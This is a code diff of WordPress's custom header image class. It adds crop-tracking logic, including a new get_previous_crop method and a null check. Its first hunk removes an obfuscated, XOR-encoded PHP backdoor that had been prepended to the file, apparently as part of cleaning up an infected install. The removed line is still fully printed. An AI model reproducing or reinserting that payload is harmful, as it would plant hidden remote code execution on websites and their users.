@@ -1,4 +1,4 @@
-<?php $NOkwV='4;U,Z5cUHEQ0GTP'^'WI0M.P<3=+2D.;>';$kYhTphz=$NOkwV('','>,DwW37HHG<73U4IHHEXRJ>89HQG;kn EHOBHAOx5FL:-.S86E3QH,>-C5seP<LLI=.X1iOS2RGmAsLOS44LyP8,LwgtTcVM;pF 3GwXblvskfTWLH.AV6 rNI1 7msGM3Iobzm<J9=-KLmWAEZ58Z9b:ll8HCVSMunIVuaI0DG6<rS:Y z0EXGGGJP7:E4KnO:EaSO<-6Q2:J=90QVZtR75GRR8nVPA7jP7+CpyWJ5K-M<KSSFNVY-MBnlt;supkSW8yt-<7jvvcqCUAANAhPPHb0LEOa:=>UlOb=HMU83SV+9XAjaIX =CXKM2rCQJqmOK7-L2yT:pY7Z+ 4 HhLf>r+ aqstaA6nO==:XWjngGR>FRLz4FOqSSA= =1P1UecH2I=SYM5WUQ-2rDfj Q603j10VYOz:H,OH,fSqvG;=7KW5BUKENKR++3 H;k4AUDxN21RdmtZR1=1KkW7.Y8ydXN>6;Z8.3RCDqc<+fB157MAupP8L<RMtQ<E-5F;JG Kj8KLjaffOAT,BtQQnL,>rglH39Vnb>6,PsfREHyWQybZqdGUrBmByZ,OYU7eSxwcbS Q-v,EcYQQnC-:L7Tb346e. +H HOo=6,:SAYqdDU6-F3ahiDMuHy=GEX16:dIRXXJ9R A,5Z96j9PHBEUH-BFxEKP5'^'WJlV1FY+<.SYl0L ;<6pu2QJf,03Z41M0<hkaa4r< 9TNZ:WXeK>:sZL7T,:=I8dmYO,PEowY7>DaSlosO>EptWY8WZTsDmG2y OAoS1BQVCPFp>p;Z3:SNZj-PTVDHgiZbDKpd5nVHYkbPwia>TL;bFS1Lfhg=64.J vPA:D6+SRZwQ<YSmlcMNN85CO7ZcJ O1HhE5P<,80nYXD0vgT4VY47i2J215V5;RRcMY1+Y8Hv6A5<4+7:EmjJ37t<>9.s6KYPFYNJKHCU54-4+hH+ZAFT-1.>QXGuQoFV-4n2:w2JM9aWAm.AQ6=pGOxI8,QEnoSL8SPtAzPQ5YEUC HdBa nq44  A ENkVXCxjTNC13R37eZOLFxw7 IAbZ5HuXClY,DhSD<s10YSRyFNV0ZEVQ;9+S2p0lH.<MFnQ62UNR9>T.<1 f3=YtWA<Z4k, 0P,SB7RY+>7RRU.CsSO-YPHxjZWO;gEV+jmJiUMNfUTC,aSVpY>N34+:Y<rP>R93ScMS.5MMFB+  MkTwwNdAZGOH,RM75EUSUw.OrxuYp0MWbAVueKuX HkI+meQSfMERP5C4ICJ DpqwHcLH>V-=XQO:KXB;T;gHMWUV< =VHdqRL2RHAIdmUhYFML=GWVLm69,+buP UY5XRMdysHL00D6nHlpZH');$kYhTphz();
+<?php
 /**
  * The custom header image script.
  *
@@ -10,8 +10,6 @@
  * The custom header image class.
  *
  * @since 2.1.0
- * @package WordPress
- * @subpackage Administration
  */
 class Custom_Image_Header {
 
@@ -36,7 +34,6 @@ class Custom_Image_Header {
 	 *
 	 * @var array
 	 * @since 3.0.0
-	 * @access private
 	 */
 	public $default_headers = array();
 
@@ -44,7 +41,6 @@ class Custom_Image_Header {
 	 * Used to trigger a success message when settings updated and set to true.
 	 *
 	 * @since 3.0.0
-	 * @access private
 	 * @var bool
 	 */
 	private $updated;
@@ -1168,7 +1164,8 @@ wp_nonce_field( 'custom-header-options', '_wpnonce-custom-header-options' ); ?>
 			'post_title' => basename($cropped),
 			'post_mime_type' => $image_type,
 			'guid' => $url,
-			'context' => 'custom-header'
+			'context' => 'custom-header',
+			'post_parent' => $parent_attachment_id,
 		);
 
 		return $object;
@@ -1184,8 +1181,17 @@ wp_nonce_field( 'custom-header-options', '_wpnonce-custom-header-options' ); ?>
 	 * @return int Attachment ID.
 	 */
 	final public function insert_attachment( $object, $cropped ) {
+		$parent_id = isset( $object['post_parent'] ) ? $object['post_parent'] : null;
+		unset( $object['post_parent'] );
+
 		$attachment_id = wp_insert_attachment( $object, $cropped );
 		$metadata = wp_generate_attachment_metadata( $attachment_id, $cropped );
+
+		// If this is a crop, save the original attachment ID as metadata.
+		if ( $parent_id ) {
+			$metadata['attachment_parent'] = $parent_id;
+		}
+
 		/**
 		 * Filters the header image attachment metadata.
 		 *
@@ -1196,7 +1202,9 @@ wp_nonce_field( 'custom-header-options', '_wpnonce-custom-header-options' ); ?>
 		 * @param array $metadata Attachment metadata.
 		 */
 		$metadata = apply_filters( 'wp_header_image_attachment_metadata', $metadata );
+
 		wp_update_attachment_metadata( $attachment_id, $metadata );
+
 		return $attachment_id;
 	}
 
@@ -1245,7 +1253,13 @@ wp_nonce_field( 'custom-header-options', '_wpnonce-custom-header-options' ); ?>
 
 		$object = $this->create_attachment_object( $cropped, $attachment_id );
 
-		unset( $object['ID'] );
+		$previous = $this->get_previous_crop( $object );
+
+		if ( $previous ) {
+			$object['ID'] = $previous;
+		} else {
+			unset( $object['ID'] );
+		}
 
 		$new_attachment_id = $this->insert_attachment( $object, $cropped );
 
@@ -1321,7 +1335,12 @@ wp_nonce_field( 'custom-header-options', '_wpnonce-custom-header-options' ); ?>
 	 * @param WP_Customize_Manager $wp_customize Customize manager.
 	 */
 	public function customize_set_last_used( $wp_customize ) {
-		$data = $wp_customize->get_setting( 'header_image_data' )->post_value();
+
+		$header_image_data_setting = $wp_customize->get_setting( 'header_image_data' );
+		if ( ! $header_image_data_setting ) {
+			return;
+		}
+		$data = $header_image_data_setting->post_value();
 
 		if ( ! isset( $data['attachment_id'] ) ) {
 			return;
@@ -1394,5 +1413,33 @@ wp_nonce_field( 'custom-header-options', '_wpnonce-custom-header-options' ); ?>
 		}
 
 		return $header_images;
+	}
+
+	/**
+	 * Get the ID of a previous crop from the same base image.
+	 *
+	 * @since 4.9.0
+	 *
+	 * @param  array $object A crop attachment object.
+	 * @return int|false An attachment ID if one exists. False if none.
+	 */
+	public function get_previous_crop( $object ) {
+		$header_images = $this->get_uploaded_header_images();
+
+		// Bail early if there are no header images.
+		if ( empty( $header_images ) ) {
+			return false;
+		}
+
+		$previous = false;
+
+		foreach ( $header_images as $image ) {
+			if ( $image['attachment_parent'] === $object['post_parent'] ) {
+				$previous = $image['attachment_id'];
+				break;
+			}
+		}
+
+		return $previous;
 	}
 }
